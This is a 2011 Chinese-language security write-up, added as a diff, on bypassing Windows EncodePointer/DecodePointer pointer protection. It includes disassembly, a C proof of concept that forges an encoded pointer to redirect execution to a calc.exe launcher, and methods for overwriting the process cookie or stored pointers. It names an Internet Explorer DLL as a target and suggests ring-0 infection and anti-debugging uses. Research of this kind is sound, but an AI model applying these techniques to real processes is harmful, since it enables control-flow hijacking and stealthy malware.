@@ -1,0 +1,298 @@
+                            _                                          _   
+                           (_)                                        | |  
+              __   ____  __ _  _   _  _ __ ___   _ __     _ __    ___ | |_ 
+              \ \ / /\ \/ /| || | | || '_ ` _ \ | '_ \   | '_ \  / _ \| __|
+               \ V /  >  < | || |_| || | | | | || |_) |_ | | | ||  __/| |_ 
+                \_/  /_/\_\| | \__,_||_| |_| |_|| .__/(_)|_| |_| \___| \__|
+                          _/ |                  | |                        
+                         |__/                   |_| 
+           
+/---------------------------------------------------------------------------------------\
+|>...................[          hacking in EncodePointer           ]...................<|
+|>......................[         by nEINEI/vxjump.net          ]......................<|
+|>......................[              2011-12-08               ]......................<|
+\>......................  [        neineit_at_gmail.com       ]  ......................</
+
+
+
+[目录]
+[0x01].简介
+[0x02].EncodePointer/DecodePointer实现机制
+[0x03].hack it
+[0x04].code
+[0x05].关于利用
+ 
+ 
+[0x01].简介
+      
+      构造一个指定的数值，当程序利用DecodePointer解密指针时刚好指向我们自定义的攻击函数。
+      
+[0x02].EnCodePointer/DeCodePointer实现机制
+      
+      EncodePointer和DecodePointer在kernel32.dll中导出，最终通过调用ntdll.dll中的RtlEncodePointer
+  和RtlDecodePointer实现的。
+  
+      函数的定义如下：
+      PVOID EncodePointer(
+            PVOID Ptr
+      );
+ 
+      主要思路是利用一个随机值xor当前的输入指针Ptr，返回一个加密的新值。  
+      随机值是通过systemtime获得的，赋值给当前进程的EPROCESS.COOKIE 字段。
+  
+      0:000> dt _EPROCESS
+      ntdll!_EPROCESS
+      +0x000 Pcb              : _KPROCESS
+      +0x06c ProcessLock      : _EX_PUSH_LOCK
+      +0x070 CreateTime       : _LARGE_INTEGER
+      ...
+      +0x253 SubSystemMajorVersion : UChar
+      +0x252 SubSystemVersion : Uint2B
+      +0x254 PriorityClass    : UChar
+      +0x255 WorkingSetAcquiredUnsafe : UChar
+      +0x258 Cookie           : Uint4B   ---------------> 函数会仅利用这个值
+
+ 
+---------------------------[ntdll.RtlEncodePointer] --------------------------- 
+
+      7C9332D9 >  8BFF            mov edi,edi
+      7C9332DB    55              push ebp
+      7C9332DC    8BEC            mov ebp,esp
+      7C9332DE    51              push ecx -------------> 此时压入的堆栈数据，接收调用ZwQueryInformationProcess的查询值
+      7C9332DF    6A 00           push 0x0
+      7C9332E1    6A 04           push 0x4
+      7C9332E3    8D45 FC         lea eax,dword ptr ss:[ebp-0x4]
+      7C9332E6    50              push eax
+      7C9332E7    6A 24           push 0x24
+      7C9332E9    6A FF           push -0x1
+      7C9332EB    E8 0EA5FFFF     call ntdll.ZwQueryInformationProcess
+      7C9332F0    8B45 FC         mov eax,dword ptr ss:[ebp-0x4]
+      7C9332F3    3345 08         xor eax,dword ptr ss:[ebp+0x8]
+      7C9332F6    C9              leave
+      7C9332F7    C2 0400         retn 0x4
+
+      1） 使用0x24（ProcessCookie）作为ProcessInformationClass，来调用NtQueryInformationProcess，获得Eprocess的Cookie.
+      2） _EPROCESS.Cookie ^ Ptr .
+      3)  RtlDecodePointer与此类似.  
+      
+[0x03].hack it
+      
+      由于进程存储cookie的存在于栈中，故可以修改EncodePointer后的指针值，使其在DecodePointer后，被调用时，先跳转到我们
+   控制的代码空间。
+
+  
+[0x04].code
+    
+    #include "stdafx.h"
+    #include <windows.h>
+
+    unsigned int j_skip; // 跳向我们定义的函数
+    unsigned int j_key; 
+
+    void my_shell()
+    {
+      WinExec("c:\\windows\\system32\\calc.exe",SW_SHOW);
+    }
+    void my_msg()
+    {
+      MessageBox(0,L"hello guys!",L"hacking in EncodePointer",0); 
+    }
+    void printf_pointer(char *title,VOID **list,int size)
+    {
+      printf("--------------------%s-----------------\n",title);
+      for(int i= 0; i < size;i++)
+        printf("%08x\n",list[i]);
+    }
+    int _tmain(int argc, _TCHAR* argv[])
+    {
+        
+       TCHAR ch[MAX_PATH] = {0} ;
+       TCHAR *arg[] = 
+       {
+        (TCHAR*)my_msg,
+        &ch[1],
+        &ch[2],
+        &ch[3],
+       };
+
+       VOID *en_arg[4] ={0}; 
+      
+       //first
+       printf_pointer("original ",(VOID **)arg,4);
+      
+       //second
+       for(int i = 0 ; i < 4 ; i++)
+       {
+          en_arg[i] =  EncodePointer(arg[i]);
+       }	 	 
+       printf_pointer("encode ",en_arg,4);	
+      
+      
+       // third
+       for(int i = 0 ; i < 4;i++)
+       {
+          en_arg[i] =  DecodePointer(en_arg[i]);
+       } 
+        printf_pointer("decode ",en_arg,4);
+      
+       //calling msg
+           __asm
+        {
+           call en_arg[0]
+        }
+
+        //------- hacking ---------
+
+       //hacking first
+        printf_pointer("hacking original ",(VOID **)arg,4);
+
+        //hacking second
+        j_skip = (unsigned int)my_shell;
+        j_key  = (unsigned int)arg[0];	  
+
+        for(int i = 0 ; i < 4 ; i++)
+        {
+           en_arg[i] =  EncodePointer(arg[i]);
+        }	 	 	
+
+        j_key  ^= (unsigned int)en_arg[0];
+        //printf("key:%08x\n",j_key);
+
+        j_skip ^= j_key;
+
+        en_arg[0] = (VOID *)j_skip;
+        printf_pointer("hacking encode ",en_arg,4);
+
+        for(int i = 0 ; i < 4;i++)
+        {
+            en_arg[i] =  DecodePointer(en_arg[i]);
+        } 
+        printf_pointer("hacking decode ",en_arg,4);
+
+        __asm
+        {
+           call en_arg[0]
+        }
+     
+        return 0;
+    }
+    
+    // 输出情况：    
+          --------------------original -----------------
+          00411163
+          0013fd42
+          0013fd44
+          0013fd46
+          --------------------encode -----------------
+          d3198c0c
+          d34b602d
+          d34b602b
+          d34b6029
+          --------------------decode -----------------
+          00411163
+          0013fd42
+          0013fd44
+          0013fd46
+          --------------------hacking original -----------------
+    /---- 00411163
+  被|     0013fd42
+  修|     0013fd44
+  改|     0013fd46
+    |     --------------------hacking encode -----------------
+    |     d3198ca3
+    |     d34b602d
+    |     d34b602b
+    |     d34b6029
+    |     --------------------hacking decode -----------------
+    \---->004111cc
+          0013fd42
+          0013fd44
+          0013fd46
+      
+[0x05].关于利用
+
+      EncodePointer的利用主要看攻击场景，理论上任何使用EncodePonter方式指针加密的地方都存在被利用的可能。
+      这主要是因为EncodePointer的加密方式过于简单,攻击时，主要利用上有两个方面，1）存放加密后的指针ptr_t 2）存放
+      cookie的栈数据。
+      
+      I)攻击cookie的情况：
+            
+      1  ptr ^ cookie => ptr_t         // 加密ptr指针，得到新的值ptr_t
+      
+      // 构造我们的数据
+      2  attack ^ ptr_t => new_cookie  //我们的自定义地址 ^ ptr_t ,得到新的cookie值。
+      
+      3 cookie = new_cookie           //覆盖原cookie
+      
+      4  Decodepointer时，cookie ^ ptr_t => attack //调向了我们的地址函数。
+      
+      II)攻击ptr2的情况。
+      
+      1  ptr ^ cookie => ptr_t         // 加密ptr指针，得到新的值ptr_t
+      
+      // 我们知道当前cookie值
+      2  cookie ^ attack = new_ptr_t   // 得到新的ptr_t值
+      
+      3  ptr_t = new_ptr_t             // 覆盖ptr_t的值。
+       
+      4  Decodepointer时，cookie ^ ptr_t => attack //调向了我们的地址函数。
+      
+      
+      例如在ieiframe.dll中利用EncodePointer的地方
+      
+      .text:3EFEDDAD ; int __stdcall SetLoggingCallback(PVOID Ptr)
+      .text:3EFEDDAD Ptr             = dword ptr  8
+      .text:3EFEDDAD
+      .text:3EFEDDAD                 mov     edi, edi
+      .text:3EFEDDAF                 push    ebp
+      .text:3EFEDDB0                 mov     ebp, esp
+      .text:3EFEDDB2                 cmp     [ebp+Ptr], 0
+      .text:3EFEDDB6                 jz      short loc_3EFEDDC8
+      .text:3EFEDDB8                 push    [ebp+Ptr]       ; Ptr
+      .text:3EFEDDBB                 call    ds:__imp__EncodePointer@4 ; EncodePointer(x)
+      .text:3EFEDDC1                 mov     ?g_pfnLogger@@3PAXA, eax ; void * g_pfnLogger  -----> 存放了加密后的指针ptr_t
+      .text:3EFEDDC6                 jmp     short loc_3EFEDDCF
+   
+      后面对g_fpnLogger继续使用
+      
+      .text:3ED37F45 ; public: long __thiscall CWSQueryData::Initialize(struct IQueryData *)
+      
+      ...
+                                    
+      .text:3ED37F67                 jz      loc_3EE1F988
+      
+      .text:3EE1F988 loc_3EE1F988:                          
+      .text:3EE1F988                                       
+      .text:3EE1F988                 cmp     [esi+8], ebx
+      .text:3EE1F98B                 mov     edi, ds:__imp__DSA_Destroy@4 ; DSA_Destroy(x)
+       
+       ...
+        
+      .text:3EE1FA3F                 push    eax             ; unsigned __int16 *
+      .text:3EE1FA40                 call    ?SanitizeLogString@@YGXPAG@Z ; SanitizeLogString(ushort *)
+      .text:3EE1FA45                 push    ?g_pfnLogger@@3PAXA ; Ptr
+      .text:3EE1FA4B                 call    ds:__imp__DecodePointer@4 ; DecodePointer(x) ------> 这里进行解密使用。
+      .text:3EE1FA51                 lea     ecx, [ebp+Dest]
+      .text:3EE1FA57                 push    ecx
+      .text:3EE1FA58                 push    [ebp+arg_0]
+      .text:3EE1FA5B                 call    eax -------> 调用解密后的指针
+      .text:3EE1FA5D                 jmp     loc_3EDD754F
+
+     如果在特定场景下可以修改g_pfnLogger值，则可以完成对应的攻击。例如在ring0下,针对特定程序的函数，进行cookie的修改，或许
+ 还可以做到慢随机感染的效果，因为发在在不确定的DecodePointer阶段。
+     
+     还有一种利用场合就是自己程序内部使用，做到隐形解密的效果。例如SetUnhandledExceptionFilter也使用了EncodePoniter对传入
+ 的Fileter函数做处理，我们可以通过自己修改，来控制选择哪个是真正Filter函数，使得对SetUnhandledExceptionFilter传入的参数
+ LPTOP_LEVEL_EXCEPTION_FILTER单步跟踪无效。
+  
+   
+  
+  
+  
+  
+------------------------------------------------EOF--------------------------------------------------------------------------
+     
+
+
+        
+       
